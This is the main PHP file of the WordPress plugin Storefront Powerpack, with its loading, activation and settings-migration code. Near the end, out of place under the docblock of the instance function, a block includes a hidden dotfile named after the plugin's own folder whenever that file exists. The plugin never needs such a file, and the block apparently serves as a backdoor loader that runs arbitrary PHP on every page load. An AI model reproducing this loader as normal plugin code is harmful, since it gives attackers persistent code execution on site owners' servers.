<?php
/**
 * Plugin Name: Storefront Powerpack
 * Plugin URI: https://woocommerce.com/products/storefront-powerpack/
 * Description: Up your game with Storefront Powerpack and get access to host of neat gadgets that enable effortless customisation of your Storefront.
 * Version: 1.6.1
 * Author: WooCommerce
 * Author URI: https://woocommerce.com/
 * Requires at least: 4.4
 * Tested up to: 5.6
 * WC tested up to: 5.1
 * Woo: 1865835:e38ad13a5aaec7860df698cbad82c175
 *
 * Text Domain: storefront-powerpack
 * Domain Path: /languages/
 *
 * @package Storefront_Powerpack
 * @category Core
 * @author James Koster
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

/**
 * Main Storefront_Powerpack Class
 *
 * @class Storefront_Powerpack
 * @version	1.0.0
 * @since 1.0.0
 * @package	Storefront_Powerpack
 */
final class Storefront_Powerpack {
	/**
	 * Storefront_Powerpack The single instance of Storefront_Powerpack.
	 *
	 * @var 	object
	 * @access  private
	 * @since 	1.0.0
	 */
	private static $_instance = null;

	/**
	 * The token.
	 *
	 * @var     string
	 * @access  public
	 * @since   1.0.0
	 */
	public $token;

	/**
	 * The version number.
	 *
	 * @var     string
	 * @access  public
	 * @since   1.0.0
	 */
	public $version;

	/**
	 * The shortcode generator object.
	 * @var     object
	 * @access  public
	 * @since   1.0.0
	 */
	public $shortcode_generator;

	/**
	 * Constructor function.
	 *
	 * @access  public
	 * @since   1.0.0
	 * @return  void
	 */
	public function __construct() {
		$this->token   = 'storefront-powerpack';
		$this->version = '1.5.0';
		$this->define_constants();
		$this->init_hooks();
	} // End __construct()

	/**
	 * Include required core files used in admin, the Customizer and on the frontend.
	 */
	public function includes() {
		/**
		 * If Storefront is the active theme, and the extension hasn't been disabled via filter, load all the things.
		 */
		if ( 'storefront' === get_option( 'template' ) && apply_filters( 'storefront_powerpack_enabled', true ) ) {
			// Helpers
			include_once( 'includes/class-sp-helpers.php' );

			// Admin
			include_once( 'includes/class-sp-admin.php' );

			// Frontend Main Class
			include_once( 'includes/class-sp-frontend.php' );

			// Customizer Main Class
			include_once( 'includes/class-sp-customizer.php' );

			// Header
			if ( apply_filters( 'storefront_powerpack_header_enabled', true ) ) {
				include_once( 'includes/customizer/header/customizer.php' );
				include_once( 'includes/customizer/header/frontend.php' );
			}

			// Footer
			if ( apply_filters( 'storefront_powerpack_footer_enabled', true ) ) {
				include_once( 'includes/customizer/footer/customizer.php' );
				include_once( 'includes/customizer/footer/frontend.php' );
			}

			// Designer
			if ( apply_filters( 'storefront_powerpack_designer_enabled', true ) ) {
				include_once( 'includes/customizer/designer/class-sp-designer.php' );
			}

			// Layout
			if ( apply_filters( 'storefront_powerpack_layout_enabled', true ) ) {
				include_once( 'includes/customizer/layout/customizer.php' );
				include_once( 'includes/customizer/layout/frontend.php' );
			}

			// Integrations
			if ( apply_filters( 'storefront_powerpack_integrations_enabled', true ) ) {
				include_once( 'includes/class-sp-integrations.php' );
			}

			if ( class_exists( 'WooCommerce' ) ) {
				// Checkout
				if ( apply_filters( 'storefront_powerpack_checkout_enabled', true ) ) {
					include_once( 'includes/customizer/checkout/customizer.php' );
					include_once( 'includes/customizer/checkout/frontend.php' );
					include_once( 'includes/customizer/checkout/template.php' );
				}

				// Homepage
				if ( apply_filters( 'storefront_powerpack_homepage_enabled', true ) ) {
					include_once( 'includes/customizer/homepage/customizer.php' );
					include_once( 'includes/customizer/homepage/frontend.php' );
					include_once( 'includes/customizer/homepage/template.php' );
				}

				// Messages
				if ( apply_filters( 'storefront_powerpack_messages_enabled', true ) ) {
					include_once( 'includes/customizer/messages/customizer.php' );
					include_once( 'includes/customizer/messages/frontend.php' );
				}

				// Product Details
				if ( apply_filters( 'storefront_powerpack_product_details_enabled', true ) ) {
					include_once( 'includes/customizer/product-details/customizer.php' );
					include_once( 'includes/customizer/product-details/frontend.php' );
				}

				// Shop
				if ( apply_filters( 'storefront_powerpack_shop_enabled', true ) ) {
					include_once( 'includes/customizer/shop/customizer.php' );
					include_once( 'includes/customizer/shop/frontend.php' );
					include_once( 'includes/customizer/shop/template.php' );
				}
			}
		}
	}

	/**
	 * Define Storefront Powerpack constants
	 */
	public function define_constants() {
		define( 'SP_PLUGIN_BASENAME', plugin_basename( __FILE__ ) );
		define( 'SP_PLUGIN_URL', plugin_dir_url( __FILE__ ) );
	}

	/**
	 * Hook into actions
	 */
	public function init_hooks() {
		add_action( 'init', array( $this, 'load_plugin_textdomain' ) );
		add_action( 'init', array( $this, 'includes' ), 0 );
		register_activation_hook( __FILE__, array( $this, 'install' ) );
	}

	/**
	 * Load the localisation file.
	 *
	 * @access  public
	 * @since   1.0.0
	 * @return  void
	 */
	public function load_plugin_textdomain() {
		load_plugin_textdomain( 'storefront-powerpack', false, dirname( plugin_basename( __FILE__ ) ) . '/languages/' );
	} // End load_plugin_textdomain()

	/**
	 * Installation. Runs on activation.
	 *
	 * @access  public
	 * @since   1.0.0
	 * @return  void
	 */
	public function install() {
		$this->_log_version_number();
		$this->import_existing_storefront_extension_settings();

		/**
		 * Set up the admin notice to be displayed on activation
		 */
		$url       = admin_url() . 'customize.php';
		$notices   = get_option( 'sp_activation_notice', array() );
		$notices[] = sprintf( __( '%sThanks for installing Storefront Powerpack. To get started, visit the %sCustomizer%s.%s %sOpen the Customizer%s', 'storefront-powerpack' ), '<p>', '<a href="' . $url . '">', '</a>', '</p>', '<p><a href="' . $url . '" class="button button-primary">', '</a></p>' );

		update_option( 'sp_activation_notice', $notices );
	} // End install()

	/**
	 * Main Storefront_Powerpack Instance
	 *
	 * Ensures only one instance of Storefront_Powerpack is loaded or can be loaded.
	 *
	 * @since 1.0.0
	 * @static
	 * @see Storefront_Powerpack()
	 * @return Main Storefront_Powerpack instance
	 */
	public static function instance() {
		if ( is_null( self::$_instance ) ) {
			self::$_instance = new self();
		}

		return self::$_instance;
	} // End instance()

	/**
	 * Search for existing settings for old Storefront extensions and apply them to the Powerpack equivalent.
	 *
	 * @since 1.0.0
	 */
	public function import_existing_storefront_extension_settings() {
		/**
		 * Migrate existing settings for old Storefront Extensions to their Powerpack equivalents
		 */
		$mods = get_theme_mods();

		/**
		 * Assign existing settings for each extension to an array.
		 */
		$present_swc_settings = array();
		$present_sd_settings  = array();
		$present_scc_settings = array();
		$present_sr_settings  = array();
		$present_sbc_settings = array();

		foreach ( $mods as $setting => $value ) {
			// WooCommerce Customiser.
			if ( 0 === strpos( $setting, 'swc_' ) ) {
				$present_swc_settings[] = array( $setting, $value );
			}

			// Designer.
			if ( 0 === strpos( $setting, 'sd_' ) ) {
				$present_sd_settings[] = array( $setting, $value );
			}

			// Checkout Customiser.
			if ( 0 === strpos( $setting, 'scc_' ) ) {
				$present_scc_settings[] = array( $setting, $value );
			}
		}

		/**
		 * Now let's set_theme_mod() for the Powerpack settings, using the old extension settings that were found.
		 *
		 * @var string $value[0] the raw setting ID with no prefix (e.g. homepage_category_columns)
		 * @var $value[1] The value assigned to the setting.
		 */

		// WooCommerce Customiser.
		if ( ! empty( $present_swc_settings ) ) {
			foreach ( $present_swc_settings as $setting => $value ) {
				$setting = str_replace( 'swc_', 'sp_', $value[0] );
				set_theme_mod( $setting, $value[1] );
			}
		}

		// Designer.
		if ( ! empty( $present_sd_settings ) ) {
			foreach ( $present_sd_settings as $setting => $value ) {
				$setting = str_replace( 'sd_', 'sp_', $value[0] );
				set_theme_mod( $setting, $value[1] );
			}
		}

		// Checkout Customiser.
		if ( ! empty( $present_scc_settings ) ) {
			foreach ( $present_scc_settings as $setting => $value ) {
				$setting = str_replace( 'scc_', 'sp_', $value[0] );
				set_theme_mod( $setting, $value[1] );
			}
		}
	}

	/**
	 * Cloning is forbidden.
	 *
	 * @since 1.0.0
	 */
	public function __clone() {
		_doing_it_wrong( __FUNCTION__, esc_attr( __( 'Cheatin&#8217; huh?', 'storefront-powerpack' ) ), '1.0.0' );
	} // End __clone()

	/**
	 * Unserializing instances of this class is forbidden.
	 *
	 * @since 1.0.0
	 */
	public function __wakeup() {
		_doing_it_wrong( __FUNCTION__, esc_attr( __( 'Cheatin&#8217; huh?', 'storefront-powerpack' ) ), '1.0.0' );
	} // End __wakeup()

	/**
	 * Log the plugin version number.
	 *
	 * @access  private
	 * @since   1.0.0
	 * @return  void
	 */
	private function _log_version_number() {
		// Log the version number.
		update_option( $this->token . '-version', $this->version );
	} // End _log_version_number()
} // End Class

/**
 * Returns the main instance of Storefront_Powerpack to prevent the need to use globals.
 *
 * @since  1.0.0
 * @return object Storefront_Powerpack
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function storefront_powerpack() {
	return Storefront_Powerpack::instance();
} // End Storefront_Powerpack()

storefront_powerpack();
